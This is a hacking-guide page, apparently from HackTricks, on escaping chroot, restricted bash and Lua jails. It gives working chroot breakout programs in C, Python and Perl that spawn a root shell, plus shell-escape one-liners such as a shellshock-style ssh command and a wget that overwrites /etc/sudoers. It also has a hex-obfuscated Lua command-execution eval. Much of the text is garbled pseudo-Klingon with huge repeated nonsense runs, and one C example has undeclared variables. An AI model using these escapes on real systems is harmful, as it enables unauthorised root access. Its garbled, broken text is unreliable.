# Escaping from Jails

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## **GTFOBins**

**Search in** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **if you can execute any binary with "Shell" property**

## Chroot Escapes

From [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): The chroot mechanism is **not intended to defend** against intentional tampering by **privileged** (**root**) **users**. On most systems, chroot contexts do not stack properly and chrooted programs **with sufficient privileges may perform a second chroot to break out**.\
Usually this means that to escape you need to be root inside the chroot.

{% hint style="success" %}
The **tool** [**chw00t**](https://github.com/earthquake/chw00t) was created to abuse the following escenarios and scape from `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
If you are **root** inside a chroot you **can escape** creating **another chroot**. This because 2 chroots cannot coexists (in Linux), so if you create a folder and then **create a new chroot** on that new folder being **you outside of it**, you will now be **outside of the new chroot** and therefore you will be in the FS.

This occurs because usually chroot DOESN'T move your working directory to the indicated one, so you can create a chroot but e outside of it.
{% endhint %}

Usually you won't find the `chroot` binary inside a chroot jail, but you **could compile, upload and execute** a binary:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Klingon</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>

Perl (pIqaD)
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

{% hint style="warning" %}
Qa'Hom je vItlhutlh. vaj Qa'Hom **file descriptor** laH **current directory** 'ej **chroot** **new folder**. vaj, **access** **FD** **outside** chroot, 'ej **escapes**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
FD can be passed over Unix Domain Sockets, so:

* Create a child process (fork)
* Create UDS so parent and child can talk
* Run chroot in child process in a different folder
* In parent proc, create a FD of a folder that is outside of new child proc chroot
* Pass to child procc that FD using the UDS
* Child process chdir to that FD, and because it's ouside of its chroot, he will escape the jail
{% endhint %}

### &#x20;Root + Mount

{% hint style="warning" %}
* Mounting root device (/) into a directory inside the chroot
* Chrooting into that directory

This is possible in Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Mount procfs into a directory inside the chroot (if it isn't yet)
* Look for a pid that has a different root/cwd entry, like: /proc/1/root
* Chroot into that entry
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Create a Fork (child proc) and chroot into a different folder deeper in the FS and CD on it
* From the parent process, move the folder where the child process is in a folder previous to the chroot of the children
* This children process will find himself outside of the chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Time ago users could debug its own processes from a process of itself... but this is not possible by default anymore
* Anyway, if it's possible, you could ptrace into a process and execute a shellcode inside of it ([see this example](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Bash Jails

### Enumeration

Get info about the jail:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modify PATH

QaD jImejDaq PATH env variable vItlhutlh.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Using vim

#### Introduction

Vim is a powerful text editor that is commonly found on Linux systems. It can be used to edit files, write scripts, and even execute commands. In this section, we will explore how Vim can be used to escalate privileges and gain root access on a compromised system.

#### Escaping from Limited Bash

When an attacker gains access to a compromised system, they are often limited to a restricted shell such as Bash. However, Vim can be used to escape from this limited environment and gain access to a full-featured shell.

To start, the attacker can open Vim by typing `vim` in the restricted shell. Once inside Vim, they can execute commands by using the `:!` command followed by the desired command. For example, to execute the `id` command, the attacker can type `:!id` and press Enter.

By using this technique, the attacker can execute any command with the privileges of the user running Vim. If the user has sudo privileges, the attacker can even escalate their privileges to root by executing commands with `sudo`.

#### Conclusion

Vim can be a powerful tool for privilege escalation on a compromised system. By using Vim's ability to execute commands, an attacker can escape from a limited shell and gain access to a full-featured shell with elevated privileges. It is important for system administrators to be aware of this technique and take steps to secure their systems against it.
```bash
:set shell=/bin/sh
:shell
```
### Qap script

QapwI' _/bin/bash_ content vItlhutlh. DaH jImej!
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Get bash from SSH

If you are accessing via ssh you can use this trick to execute a bash shell:

### SSH-vaD

vaj SSH-vaD vItlhutlh. vaj 'ej vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh v
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Qap

#### Introduction

In the world of hacking, privilege escalation is a crucial technique that allows hackers to gain higher levels of access and control over a compromised system. One common scenario is when a hacker gains access to a limited bash shell and needs to escape from its restrictions to execute more powerful commands.

#### Escaping from a Limited Bash Shell

When dealing with a limited bash shell, there are several techniques that can be used to escape its constraints and gain higher privileges. Here are some of the most effective methods:

1. **Environment Variable Manipulation**: By manipulating environment variables, a hacker can trick the limited bash shell into executing commands with higher privileges. This can be achieved by modifying variables like `PATH` or `LD_LIBRARY_PATH` to point to directories containing malicious binaries.

2. **Shell Built-in Commands**: Limited bash shells often have restrictions on external commands, but they still allow the use of built-in commands. By leveraging these built-in commands, a hacker can execute powerful actions without relying on external binaries. Examples of useful built-in commands include `eval`, `exec`, and `export`.

3. **Shell Metacharacters**: Metacharacters are special characters that have a specific meaning in the shell. By using metacharacters cleverly, a hacker can bypass restrictions and execute arbitrary commands. Some commonly used metacharacters include `;`, `&`, `|`, and `>`.

4. **Shell Variables**: Limited bash shells may restrict the use of certain shell variables, but they often allow the creation and manipulation of new variables. By creating custom variables and assigning them values that allow for privilege escalation, a hacker can break free from the limitations of the limited shell.

5. **Shell Function Abuse**: Limited bash shells often allow the creation and execution of shell functions. By defining a malicious function and executing it, a hacker can gain higher privileges. This technique is particularly useful when external commands are restricted.

#### Conclusion

Escaping from a limited bash shell is a critical skill for hackers looking to escalate their privileges on a compromised system. By understanding and leveraging techniques like environment variable manipulation, shell built-in commands, shell metacharacters, shell variables, and shell function abuse, hackers can break free from the constraints of a limited shell and gain full control over a compromised system.
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

**tlhIngan Hol:**

bIQtIqDaq sudoers file vItlhutlh.
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### QaD jup

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells\*\*]\(https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io/\*\*]\(https/gtfobins.github.io)\
**It could also be interesting the page:**

{% content-ref url="../useful-linux-commands/bypass-bash-restrictions.md" %}
[bypass-bash-restrictions.md](../useful-linux-commands/bypass-bash-restrictions.md)
{% endcontent-ref %}

## Python Jails

Tricks about escaping from python jails in the following page:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Lua Jails

In this page you can find the global functions you have access to inside lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval with command execution:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
**ghItlhvam vItlhutlh** **'ej** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH** **ghItlhvam vItlhutlh** **'e'** **neH
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
# Enumerate functions of a library

## Introduction

When conducting a security assessment or penetration test, it is often necessary to analyze the functions provided by a library. This information can be crucial for identifying potential vulnerabilities or understanding how the library is used within an application.

## Methodology

To enumerate the functions of a library, you can use the following techniques:

